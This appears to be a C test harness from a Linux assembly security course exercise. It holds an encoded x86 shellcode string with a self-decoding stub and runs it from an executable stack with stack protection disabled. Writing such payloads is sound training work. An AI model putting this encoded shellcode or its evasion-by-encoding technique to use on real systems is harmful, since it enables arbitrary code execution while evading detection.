/*
Filename:      shellcode.c
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  12.12.2018
Note:          x86 code but compiled on x64
Compiler:      gcc -m32 -ggdb -fno-stack-protector -z execstack shellcode.c -o shellcode
*/

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\xeb\x21\x5e\x31\xff\x31\xc0\x31\xdb\x31\xd2\x8a\x1c\x3e\x8a\x54\x3e\x01\x30\xd3\x74\x12\x88\xd1\xd2\xcb\x88\x1c\x06\x83\xc7\x02\x40\xeb\xe8\xe8\xda\xff\xff\xff\xc6\x02\x80\x01\x81\x03\xd1\x01\xbe\x02\x5f\x01\x98\x03\x1c\x06\x60\x08\xf6\x04\xc5\x01\x92\x04\x30\x07\x64\x06\x3a\x04\x58\x08\x4f\x03\x59\x05\xd2\x06\x81\x08\x1a\x04\x5f\x07\x03\x08\xd8\x04\x0c\x04\xbb\xbb";

main()
{
  printf("Shellcode Lenght: %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
